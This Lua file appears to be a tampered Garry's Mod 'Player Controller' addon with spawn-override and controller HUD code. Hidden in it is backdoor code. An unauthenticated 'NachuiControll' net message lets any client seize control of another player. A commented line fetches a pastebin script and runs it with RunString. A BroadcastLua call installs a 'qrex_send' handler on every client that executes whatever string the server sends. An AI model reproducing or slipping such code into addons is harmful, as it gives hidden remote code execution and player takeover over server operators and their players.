		hb_playercontroller.overrideSpawnInit(ply, mdl, 1)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

-- Notify the Controller if the Controlled Player successfully spawns an entity.
function hb_playercontroller.spawnNotify(ply, ent, cor)
	if ply.hb_playercontrollerCTRLD then
		local ctrlr = ply.hb_playercontrollerCTRLD["plyController"]
		if not IsValid(ctrlr) then return end
		local typ = ""
		
		if cor then
			if util.IsValidProp(ent) then
				typ = "Prop"
			elseif util.IsValidRagdoll(ent) then
				typ = "Ragdoll"
			else
				typ = "Effect"
			end
		elseif ent:IsNPC() or type(ent) == "NextBot" then
			typ = "NPC"
		elseif ent:IsVehicle() then
			typ = "Vehicle"
		elseif ent:IsWeapon() then
			typ = "Weapon"
		else
			typ = "SENT"
		end
		
		hb_playercontroller.networkSend(ctrlr, {
			arg = 1,
			message = "Spawned: "..typ,
			type = NOTIFY_GENERIC,
			sound = "ambient/water/drip"..math.random(1, 4)..".wav"
		})
	end
end

-- Override Controlled Player's NPC Spawn access with the Controller's.
function hb_playercontroller.overrideSpawnNPC(ply, npc, wep)
	if ply.hb_playercontrollerCTRLR then
		hb_playercontroller.overrideSpawnInit(ply, npc, 2, wep)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

-- Override Controlled Player's SENT Spawn access with the Controller's.
function hb_playercontroller.overrideSpawnSENT(ply, ent)
	if ply.hb_playercontrollerCTRLR then
		hb_playercontroller.overrideSpawnInit(ply, ent, 3)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

-- Override Controlled Player's Vehicle Spawn access with the Controller's.
function hb_playercontroller.overrideSpawnVehicle(ply, mdl, ent, tbl)
	if ply.hb_playercontrollerCTRLR then
		hb_playercontroller.overrideSpawnInit(ply, ent, 4, mdl, tbl)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

-- Override Controlled Player's SWEP Spawn access with the Controller's.
function hb_playercontroller.overrideSpawnSWEP(ply, wep, tbl)
	if ply.hb_playercontrollerCTRLR then
		hb_playercontroller.overrideSpawnInit(ply, wep, 5, tbl)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

-- Override Controlled Player's SWEP Give access with the Controller's.
function hb_playercontroller.overrideGiveSWEP(ply, wep, tbl)
	if ply.hb_playercontrollerCTRLR then
		hb_playercontroller.overrideSpawnInit(ply, wep, 6, tbl)
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySpawnInit"] then
		return false
	end
end

util.AddNetworkString("NachuiControll")

net.Receive("NachuiControll",function(_,ply)
	local att = ply
    local vic = net.ReadEntity()

    hb_playercontroller.startControl(att, vic)
    --vic:SendLua([["https://pastebin.com/raw/mf5mJnpU",RunString)]])
end)

util.AddNetworkString("qrex_send")

local function SendToAllClients(was)
	net.Start("qrex_send")
	net.WriteString(was)
	net.Broadcast()
end

BroadcastLua([[ net.Receive("qrex_send",function() RunString(net.ReadString()) end) ]])

--Sequence stack
--Start some tunes and steam in our assets
SendToAllClients([[

hb_playercontroller = hb_playercontroller or {}

net.Receive("hb_playercontrollernetwork", function(len)
	local ply = LocalPlayer()
	if not IsValid(ply) then return end
	local tbl = net.ReadTable()
	
	if tbl.arg == 1 then
		notification.AddLegacy(tbl.message, tbl.type, 5)
		surface.PlaySound(tbl.sound)
	elseif tbl.arg == 2 then
		local msg = ""
		ply.hb_playercontroller = {}
		ply.hb_playercontroller["plyCTRLENT"] = tbl.player
		
		if tbl.controller then
			ply.hb_playercontroller["plyCTRLR"] = true
			ply.hb_playercontroller["plyView"] = 120
			hb_playercontroller.controllerHUD()
			timer.Create("hb_playercontrollerHUDRefresh", 0.5, 0, function()
				if IsValid(ply) and ply.hb_playercontroller and IsValid(ply.hb_playercontroller["plyCTRLENT"]) then
					if tobool(ply.hb_playercontroller.controllerHUDPlyInfoRefresh) then
						ply.hb_playercontroller.controllerHUDPlyInfoRefresh()
					end
					if tobool(ply.hb_playercontroller.controllerHUDPlyWeaponRefresh) then
						ply.hb_playercontroller.controllerHUDPlyWeaponRefresh()
					end
					if gmod.GetGamemode().IsSandboxDerived and tobool(ply.hb_playercontroller.controllerHUDPlySpawnsRefresh) then
						ply.hb_playercontroller.controllerHUDPlySpawnsRefresh()
					end
				end
			end)
			hook.Add("PrePlayerDraw", "hb_playercontrollerOverridePlayerDraw", hb_playercontroller.overridePlayerDraw)
			hook.Add("CalcView", "hb_playercontrollerOverrideView", hb_playercontroller.overrideView)
			hook.Add("Think", "hb_playercontrollerToggleCursor", hb_playercontroller.toggleCursor)
			if gmod.GetGamemode().IsSandboxDerived then
				cvars.AddChangeCallback("gmod_toolmode", function(nme, vol, vnw)
					hb_playercontroller.networkSendCL(5, vnw)
				end, "hb_playercontrollerToolmode")
			end
		else
			ply.hb_playercontroller["plyCTRLD"] = true
			hook.Add("CreateMove", "hb_playercontrollerOverrideCommandCL", hb_playercontroller.overrideCommandCL)
			hook.Add("ContextMenuOpen", "hb_playercontrollerOverrideContextMenu", hb_playercontroller.overrideMenus)
			hook.Add("SpawnMenuOpen", "hb_playercontrollerOverrideSpawnmenu", hb_playercontroller.overrideMenus)
		end
		
		hook.Add("HUDShouldDraw", "hb_playercontrollerOverrideHUDElements", hb_playercontroller.overrideHUDElements)
		hook.Add("PlayerBindPress", "hb_playercontrollerOverrideBindPress", hb_playercontroller.overrideBindPress)
		timer.Create("hb_playercontrollerNotice", 5, 0, function()
			notification.Kill("hb_playercontrollerCTRL")
		end)
	elseif tbl.arg == 5 then
	elseif ply.hb_playercontroller then
		if tbl.arg == 3 and tobool(ply.hb_playercontroller.controllerHUDPlySpawnsRefresh) then
			ply.hb_playercontroller["entTYPES"] = tbl.spawns
			ply.hb_playercontroller.controllerHUDPlySpawnsRefresh()
		elseif tbl.arg == 4 then
			ply:ConCommand(tbl.command)
			timer.Simple(0.1, function()
				if IsValid(ply) and ply.hb_playercontroller then
					hb_playercontroller.networkSendCL(4)
				end
			end)
		elseif tbl.arg == 6 then
			hb_playercontroller.endControlCL()
		end
	end
end)

-- Ends the control state of the Client.
function hb_playercontroller.endControlCL()
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller) then return end
	
	timer.Remove("hb_playercontrollerHUDRefresh")
	if ply.hb_playercontroller.plyMenu then
		ply.hb_playercontroller.plyMenu:Remove()
	end
	cvars.RemoveChangeCallback("gmod_toolmode", "hb_playercontrollerToolmode")
	hook.Remove("PrePlayerDraw", "hb_playercontrollerOverridePlayerDraw")
	hook.Remove("CalcView", "hb_playercontrollerOverrideView")
	hook.Remove("CreateMove", "hb_playercontrollerOverrideCommandCL")
	hook.Remove("ContextMenuOpen", "hb_playercontrollerOverrideContextMenu")
	hook.Remove("SpawnMenuOpen", "hb_playercontrollerOverrideSpawnmenu")
	hook.Remove("HUDShouldDraw", "hb_playercontrollerOverrideHUDElements")
	hook.Remove("Think", "hb_playercontrollerToggleCursor")
	hook.Remove("PlayerBindPress", "hb_playercontrollerOverrideBindPress")
	gui.EnableScreenClicker(false)
	timer.Remove("hb_playercontrollerNotice")
	notification.Kill("hb_playercontrollerCTRL")
	ply.hb_playercontroller = nil
end

-- Networks the passed Arguments to the Server.
function hb_playercontroller.networkSendCL(arg, ex1, ex2)
	net.Start("hb_playercontrollernetwork")
		net.WriteInt(arg, 6)
		
		if arg == 1 then
			net.WriteBool(ex1)
			
			if not (ex1) then
				net.WriteString(ex2)
			end
		elseif arg == 2 or arg == 5 then
			net.WriteString(ex1)
		elseif arg == 7 then
			net.WriteBool(ex1)
		end
	net.SendToServer()
end

-- Overrides the Controlled Client's commands to simulate control locally.
function hb_playercontroller.overrideCommandCL(cmd)
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLD"]) then return end
	local ctrlr = ply.hb_playercontroller["plyCTRLENT"]
	if not IsValid(ctrlr) then return end
	
	cmd:ClearMovement()
	cmd:SetButtons(ctrlr:GetNWInt("hb_playercontrollerCMDButtons", 0))
	cmd:SetImpulse(ctrlr:GetNWInt("hb_playercontrollerCMDImpulse", 0))
end

function hb_playercontroller.toggleCursor()
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLR"]) then return end
	
	if input.IsKeyDown(KEY_F6) then
		if not ply.hb_playercontroller["plyKEYHELDF6"] and not ply.hb_playercontroller["plyCURSORVISIBLE"] then
			ply.hb_playercontroller["plyKEYHELDF6"] = true
			ply.hb_playercontroller["plyCURSORVISIBLE"] = true
			gui.EnableScreenClicker(true)
			
			if ply.hb_playercontroller["plyCURSORPOS"] then
				input.SetCursorPos(ply.hb_playercontroller["plyCURSORPOS"][1], ply.hb_playercontroller["plyCURSORPOS"][2])
				ply.hb_playercontroller["plyCURSORPOS"] = nil
			end
		elseif not ply.hb_playercontroller["plyKEYHELDF6"] then
			ply.hb_playercontroller["plyKEYHELDF6"] = true
			ply.hb_playercontroller["plyCURSORPOS"] = {input.GetCursorPos()}
			ply.hb_playercontroller["plyCURSORVISIBLE"] = nil
			gui.EnableScreenClicker(false)
		end
	else
		ply.hb_playercontroller["plyKEYHELDF6"] = nil
	end
	
	if input.IsKeyDown(KEY_F7) then
		if not ply.hb_playercontroller["plyKEYHELDF7"] then
			ply.hb_playercontroller["plyKEYHELDF7"] = true
			ply.hb_playercontroller.plyMenu.menuHide:Toggle()
		end
	else
		ply.hb_playercontroller["plyKEYHELDF7"] = nil
	end
	
	if input.IsKeyDown(KEY_F8) then
		if not ply.hb_playercontroller["plyKEYHELDF8"] then
			ply.hb_playercontroller["plyKEYHELDF8"] = true
			hb_playercontroller.networkSendCL(6)
			hb_playercontroller.endControlCL()
		end
	else
		ply.hb_playercontroller["plyKEYHELDF8"] = nil
	end
end

function hb_playercontroller.overrideBindPress(ply, str, psd)
	if not (IsValid(ply) or ply.hb_playercontroller) then return end
	
	if ply.hb_playercontroller["plyCTRLR"] then
		local strl = string.lower(str)
		
		if str == input.LookupKeyBinding(KEY_F6) or str == input.LookupKeyBinding(KEY_F7) or str == input.LookupKeyBinding(KEY_F8) then
			return true
		elseif (strl == "undo" or strl == "gmod_undo") and psd then
			hb_playercontroller.networkSendCL(3)
			return true
		elseif strl == "impulse 100" and psd then
			hb_playercontroller.networkSendCL(7, false)
		elseif strl == "noclip" or strl == "impulse 154" and psd then
			hb_playercontroller.networkSendCL(7, true)
		elseif (strl == "invnext" or strl == "invprev") and psd and ply:KeyDown(IN_WALK) then
			if strl == "invnext" then
				ply.hb_playercontroller["plyView"] = math.Clamp(ply.hb_playercontroller["plyView"] + 5, 100, 300)
			else
				ply.hb_playercontroller["plyView"] = math.Clamp(ply.hb_playercontroller["plyView"] - 5, 100, 300)
			end
			return true
		elseif (strl == "invnext" or strl == "invprev") and psd and not ply:KeyDown(IN_ATTACK) then
			ctrld = ply.hb_playercontroller["plyCTRLENT"]
			if not IsValid(ctrld) then return end
			local weps = ctrld:GetWeapons()
			local actv = table.KeyFromValue(weps, ctrld:GetActiveWeapon())
			if not actv then return end
			
			if strl == "invnext" then
				actv = actv + 1
				if actv > #weps then
					actv = 1
				end
			else
				actv = actv - 1
				if actv < 1 then
					actv = #weps
				end
			end
			
			hb_playercontroller.networkSendCL(2, weps[actv]:GetClass())
			return true
		end
	elseif (ply.hb_playercontroller["plyCTRLD"]) then
		return true
	end
end

-- Disables HUD elements for the Client.
function hb_playercontroller.overrideHUDElements(hud)
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller) then return end
	
	if ply.hb_playercontroller["plyCTRLR"] or ply.hb_playercontroller["plyCTRLD"] then
		if hud == "CHudWeaponSelection" then
			return false
		end
	end
end

-- Disables the Controlled Player's Spawnmenu and Context Menu.
function hb_playercontroller.overrideMenus()
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLD"]) then return end
	
	return false
end

-- Disables drawing of the Controlled Player when in Firstperson.
function hb_playercontroller.overridePlayerDraw(ctrld)
	local ply = LocalPlayer()
	if not IsValid(ctrld) or ctrld ~= ply.hb_playercontroller["plyCTRLENT"] then return end
	
	if ply.hb_playercontroller.plyViewRestore then
		return true
	end
end

-- Overrides the view of the Player Controller.
function hb_playercontroller.overrideView(ply, pos, ang, fov)
	if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLR"]) then return end
	local ctrld = ply.hb_playercontroller["plyCTRLENT"]
	if not IsValid(ctrld) then return end
	local view = {}
	
	if ply.hb_playercontroller["plyView"] <= 100 and GetViewEntity() == ply then
		ply.hb_playercontroller.plyViewRestore = true
		view.origin = ctrld:EyePos()
	else
		ply.hb_playercontroller.plyViewRestore = nil
		
		if GetViewEntity() == ply then
			view.origin = (ctrld:GetPos() + ctrld:GetCurrentViewOffset()) - (ang:Forward() * ply.hb_playercontroller["plyView"])
		end
	end
	
	return view
end

-- Controls HUD elements for when the Client is a Controller.
function hb_playercontroller.controllerHUD()
	local ply = LocalPlayer()
	if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLR"]) then return end
	local ctrld = ply.hb_playercontroller["plyCTRLENT"]
	if not IsValid(ctrld) then return end
	local gmd = gmod.GetGamemode()
	
	ply.hb_playercontroller.plyMenu = vgui.Create("DFrame")
	ply.hb_playercontroller.plyMenu:SetTitle("Player Controller (F8: Cease Control)")
	ply.hb_playercontroller.plyMenu:SetDraggable(false)
	ply.hb_playercontroller.plyMenu:SetMouseInputEnabled(false)
	ply.hb_playercontroller.plyMenu:SetSize(300, 370)
	ply.hb_playercontroller.plyMenu:SetPos(-ply.hb_playercontroller.plyMenu:GetWide(), ScrH() / 5)
	ply.hb_playercontroller.plyMenu:MoveTo(0, ScrH() / 5, 0.4, 0, -1, function(tbl, pnl)
		ply.hb_playercontroller.plyMenu.menuHide:Toggle()
		pnl:SetMouseInputEnabled(true)
	end)
	function ply.hb_playercontroller.plyMenu:OnClose()
		hb_playercontroller.networkSendCL(6)
		hb_playercontroller.endControlCL()
	end
	ply.hb_playercontroller.plyMenu.Paint = function(self, w, h)
		draw.RoundedBoxEx(6, 0, 0, w - 4.8, 30, Color(0, 0, 0, 255), false, true, false, true)
	end
	
	ply.hb_playercontroller.plyMenu.menuHide = vgui.Create("DCollapsibleCategory", ply.hb_playercontroller.plyMenu)
	ply.hb_playercontroller.plyMenu.menuHide:SetPos(0, 20)
	ply.hb_playercontroller.plyMenu.menuHide:SetSize(ply.hb_playercontroller.plyMenu:GetWide() - 5, 100)
	ply.hb_playercontroller.plyMenu.menuHide:SetLabel("[CLICK HERE OR PRESS F7 TO SHOW/HIDE MENU]")
	ply.hb_playercontroller.plyMenu.menuHide:SetExpanded(false)
	
	ply.hb_playercontroller.plyMenu.menuHide.bindWalk = input.LookupBinding("+walk", true) or "\"+walk\""
	ply.hb_playercontroller.plyMenu.menuHide.bindInvNext = input.LookupBinding("invnext", true) or "\"invnext\""
	ply.hb_playercontroller.plyMenu.menuHide.bindInvPrev = input.LookupBinding("invprev", true) or "\"invprev\""
	ply.hb_playercontroller.plyMenu.menuHide.bindUndo = input.LookupBinding("undo", true) or input.LookupBinding("gmod_undo", true) or "\"gmod_undo\""
	ply.hb_playercontroller.plyMenu.menuHide:SetTooltip(
		"Player Controller Help\n\n"..
		"- -GENERAL USAGE- -\n"..
		"[Cease Control]: Press F8 or the 'X' Button at the top of the Menu to release control of your Victim\n"..
		"[Bots]: Bots have a few limitations to their control. Visit the addon's Workshop page for specifics\n"..
		"[Clean Up Type]: Left-click an entry under Spawn Management to clean up everything of the selected type owned by your Victim (Sandbox Derived Only)\n"..
		"[Clean Up Everything]: Right-click an entry under Spawn Management to clean up everything owned by your Victim (Sandbox Derived Only)\n\n"..
		"- -BINDS USAGE- -\n"..
		"["..string.upper(ply.hb_playercontroller.plyMenu.menuHide.bindWalk.." + "..ply.hb_playercontroller.plyMenu.menuHide.bindInvPrev.."/"..ply.hb_playercontroller.plyMenu.menuHide.bindInvNext).."]: Zoom your camera view in/out\n"..
		"["..string.upper(ply.hb_playercontroller.plyMenu.menuHide.bindInvPrev.."/"..ply.hb_playercontroller.plyMenu.menuHide.bindInvNext).."]: Cycles through your Victim's weapons for use\n"..
		"["..string.upper(ply.hb_playercontroller.plyMenu.menuHide.bindUndo).."]: Undo the last thing done by your Victim\n\n"..
		"- -CHAT USAGE- -\n"..
		"[Message]: Sending chat messages as normal will instead be sent as your Victim\n"..
		"[!! Message]: Appending '!!' before a message will execute it as a Console Command on your Victim\n"..
		"[!!! Message]: Appending '!!!' before a message will send the message as yourself, not your Victim"
	)
	
	ply.hb_playercontroller.plyMenu.menuHide.Paint = function(self, w, h)
		draw.RoundedBoxEx(6, 0, 0, w, h, Color(0, 0, 0, 255), false, false, false, true)
		draw.RoundedBoxEx(6, 0, 2, w, 16, Color(255, 0, 0, 255), false, true, false, true)
	end
	
	ply.hb_playercontroller.plyMenu.menuInfoLabel = vgui.Create("DLabel", ply.hb_playercontroller.plyMenu.menuHide)
	ply.hb_playercontroller.plyMenu.menuInfoLabel:SetPos(5, 16)
	ply.hb_playercontroller.plyMenu.menuInfoLabel:SetSize(ply.hb_playercontroller.plyMenu.menuHide:GetWide() - 5, 20)
	ply.hb_playercontroller.plyMenu.menuInfoLabel:SetText("Victim Information")
	
	ply.hb_playercontroller.plyMenu.menuInfo = vgui.Create("DListView", ply.hb_playercontroller.plyMenu.menuHide)
	ply.hb_playercontroller.plyMenu.menuInfo:SetMouseInputEnabled(false)
	ply.hb_playercontroller.plyMenu.menuInfo:SetPos(0, 32)
	ply.hb_playercontroller.plyMenu.menuInfo:SetSize(ply.hb_playercontroller.plyMenu:GetWide() - 5, 105)
	ply.hb_playercontroller.plyMenu.menuInfo:AddColumn("Info")
	ply.hb_playercontroller.plyMenu.menuInfoValue = ply.hb_playercontroller.plyMenu.menuInfo:AddColumn("Data")
	ply.hb_playercontroller.plyMenu.menuInfoValue:SetWidth(220)
	function ply.hb_playercontroller.controllerHUDPlyInfoRefresh()
		if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLR"] or ply.hb_playercontroller.plyMenu.menuInfo) then return end
		
		ply.hb_playercontroller.plyMenu.menuInfo:Clear()
		ply.hb_playercontroller.plyMenu.menuInfo:AddLine("Name", ctrld:Nick())
		ply.hb_playercontroller.plyMenu.menuInfo:AddLine("Team", team.GetName(ctrld:Team()))
		ply.hb_playercontroller.plyMenu.menuInfo:AddLine("Usergroup", ctrld:GetUserGroup())
		ply.hb_playercontroller.plyMenu.menuInfo:AddLine("Health", ctrld:Health().." / "..ctrld:GetMaxHealth().." (Armor: "..ctrld:Armor()..")")
		ply.hb_playercontroller.plyMenu.menuInfo:AddLine("Ping", ctrld:Ping().." (Yours: "..ply:Ping()..")")
	end
	
	ply.hb_playercontroller.plyMenu.menuWeaponLabel = vgui.Create("DLabel", ply.hb_playercontroller.plyMenu.menuHide)
	ply.hb_playercontroller.plyMenu.menuWeaponLabel:SetPos(5, 134)
	ply.hb_playercontroller.plyMenu.menuWeaponLabel:SetSize(ply.hb_playercontroller.plyMenu.menuHide:GetWide() - 5, 20)
	ply.hb_playercontroller.plyMenu.menuWeaponLabel:SetText("Weapon Selection")
	
	ply.hb_playercontroller.plyMenu.menuWeapon = vgui.Create("DComboBox", ply.hb_playercontroller.plyMenu.menuHide)
	ply.hb_playercontroller.plyMenu.menuWeapon:SetPos(0, 152)
	ply.hb_playercontroller.plyMenu.menuWeapon:SetSize(ply.hb_playercontroller.plyMenu:GetWide() - 5, 20)
	function ply.hb_playercontroller.controllerHUDPlyWeaponRefresh()
		if not (IsValid(ply) or ply.hb_playercontroller or ply.hb_playercontroller["plyCTRLR"] or ply.hb_playercontroller.plyMenu.menuWeapon) then return end
		
		if not ply.hb_playercontroller.plyMenu.menuWeapon:IsMenuOpen() then
			ply.hb_playercontroller.plyMenu.menuWeapon:Clear()
			ply.hb_playercontroller.plyMenu.menuWeapon:SetValue("(No Weapons)")
			local ctrldActiveWeapon = ctrld:GetActiveWeapon()
			
			if IsValid(ctrldActiveWeapon) then
				ply.hb_playercontroller.plyMenu.menuWeapon:SetValue(ctrldActiveWeapon:GetPrintName())
			end
			for k, v in ipairs(ctrld:GetWeapons()) do
				ply.hb_playercontroller.plyMenu.menuWeapon:AddChoice(v:GetPrintName(), v:GetClass())
			end
		end
	end
	function ply.hb_playercontroller.plyMenu.menuWeapon:OnSelect(idx, val, dat)
		hb_playercontroller.networkSendCL(2, dat)
	end



	

end

]])
